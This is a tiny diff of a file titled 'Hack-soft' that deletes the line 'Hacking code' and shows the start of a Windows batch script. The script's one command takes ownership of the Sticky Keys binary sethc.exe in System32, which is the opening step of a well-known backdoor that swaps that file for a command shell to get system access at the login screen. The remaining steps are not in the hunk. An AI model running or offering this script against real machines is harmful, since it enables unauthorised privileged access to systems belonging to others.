@@ -1,5 +1,5 @@
 # Hack-soft
-Hacking code
+
 @echo off
 
 takeown /f "C:\Windows\System32\sethc.exe"
